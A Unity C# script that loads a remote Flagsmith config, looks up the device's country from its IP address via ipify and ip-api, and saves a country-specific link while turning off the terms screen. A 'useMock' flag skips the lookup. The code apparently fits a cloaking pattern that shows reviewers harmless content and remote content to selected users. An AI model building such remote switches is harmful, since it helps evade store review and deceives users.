using Flagsmith;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
#if UNITY_IOS
using UnityEngine.iOS;
#endif



public class RemoutConfigLoader : MonoBehaviour
{
    [SerializeField] private string _key;
    [SerializeField] private ConfigData _allConfigData;
    private const string _url = "https://pro.ip-api.com/json/";
    private const string _ipApiUrl = "https://api.ipify.org";
    private string _country;
    private bool _showTerms = true;
    private static FlagsmithClient _flagsmithClient;

    public Action<bool> ConfigLoadEnded;

    private void Start()
    {
#if UNITY_IOS
        if (!PlayerPrefs.HasKey("Onboarding"))
        {
        Device.RequestStoreReview();
        }
#endif
        //Перед получением данных из конфига инициализируйте свою систему сохранений, чтоб не было null при сохранении ссылки
        _flagsmithClient = new(_key);
        StartLoading();
    }


    private void StartLoading()
    {
        string HtmlText = GetHtmlFromUri("http://google.com");

        if (HtmlText != "")
        {
            if (_key != "")
            {
                if (PlayerPrefs.HasKey("link"))
                {
                    _showTerms = false;
                    LoadScene();
                }
                else
                {
                    LoadRemoutConfig();
                }
            }
            else
            {
                Debug.Log("Missing Flagsmith key");
                LoadScene();
            }
        }

        else
        {
            LoadScene();
        }
    }

    public void LoadRemoutConfig()
    {
        _ = StartAsync();
    }

    async Task StartAsync()
    {
        var flags = await _flagsmithClient.GetEnvironmentFlags();
        if (flags == null)
        {
            Debug.Log("flags null");
            LoadScene();
            return;
        }
        string values = await flags.GetFeatureValue("config");
        if (values == null || values == "")
        {
            Debug.Log("values null");
            LoadScene();
            return;
        }
        Debug.Log("Loaded");
        ProcessJsonResponse(values);
    }

    private void ProcessJsonResponse(string jsonResponse)
    {
        ConfigData config = JsonConvert.DeserializeObject<ConfigData>(jsonResponse);
        _allConfigData.useMock = config.useMock;
        _allConfigData.netApiKey = config.netApiKey;
        _allConfigData.termsLink = config.termsLink;
        _allConfigData.privacyLink = config.privacyLink;
        _allConfigData.data = config.data;
        if (_allConfigData.useMock)
        {
            LoadScene();
        }
        else
        {
            StartCoroutine(CheckInfo(_allConfigData.netApiKey));
        }
    }

    public IEnumerator CheckInfo(string apiKey)
    {
        string address = null;

        // Получаем IP-адрес
        yield return StartCoroutine(GetIpAddress(result => address = result));

        // Если адрес получен, продолжаем
        if (!string.IsNullOrEmpty(address))
        {
            yield return StartCoroutine(GetCountryCode(address, apiKey));

            // Проверяем наличие кода страны в конфигурации
            if (_allConfigData.data != null && _allConfigData.data.ContainsKey(_country))
            {
                string link = _allConfigData.data[_country];
                Debug.Log($"Link for country code {_country}: {link}");
                _showTerms = false;
                PlayerPrefs.SetString("link", link);
                LoadScene();
            }
            else
            {
                Debug.LogWarning($"Country code {_country} not found in config.");
                LoadScene();
            }
        }
        else
        {
            Debug.LogError("IP address could not be retrieved.");
            LoadScene();
        }
    }

    private IEnumerator GetIpAddress(System.Action<string> callback)
    {
        using (UnityWebRequest request = UnityWebRequest.Get(_ipApiUrl))
        {
            yield return request.SendWebRequest();

            if (request.result == UnityWebRequest.Result.ConnectionError || request.result == UnityWebRequest.Result.ProtocolError)
            {
                Debug.LogError($"Error getting IP address: {request.error}");
                callback(null); // Возвращаем null, если произошла ошибка
            }
            else
            {
                string ipAddress = request.downloadHandler.text.Trim();
                callback(ipAddress); // Возвращаем IP-адрес через callback
            }
        }
    }

    private IEnumerator GetCountryCode(string address, string apiKey)
    {
        using (UnityWebRequest request = UnityWebRequest.Get($"{_url}{address}?key={apiKey}"))
        {
            yield return request.SendWebRequest();

            if (request.result == UnityWebRequest.Result.ConnectionError || request.result == UnityWebRequest.Result.ProtocolError)
            {
                Debug.LogError($"Error: {request.error}");
            }
            else
            {
                var responseBody = request.downloadHandler.text;
                var jsonResponse = JsonConvert.DeserializeObject<Dictionary<string, object>>(responseBody);
                string code = jsonResponse["countryCode"].ToString();
                _country = code;
                Debug.Log($"Country Code: {code}");
            }
        }
    }



    private void LoadScene()
    {
        ConfigLoadEnded?.Invoke(_showTerms);
    }

    public string GetHtmlFromUri(string resource)
    {
        string html = string.Empty;
        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(resource);
        try
        {
            using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
            {
                bool isSuccess = (int)resp.StatusCode < 299 && (int)resp.StatusCode >= 200;
                if (isSuccess)
                {
                    using (StreamReader reader = new StreamReader(resp.GetResponseStream()))
                    {
                        //We are limiting the array to 80 so we don't have
                        //to parse the entire html document feel free to 
                        //adjust (probably stay under 300)
                        char[] cs = new char[80];
                        reader.Read(cs, 0, cs.Length);
                        foreach (char ch in cs)
                        {
                            html += ch;
                        }
                    }
                }
            }
        }
        catch
        {
            return "";
        }

        return html;
    }
}

[Serializable]
public class ConfigData
{
    public bool useMock;
    public string netApiKey;
    public string privacyLink;
    public string termsLink;
    public Dictionary<string, string> data;
}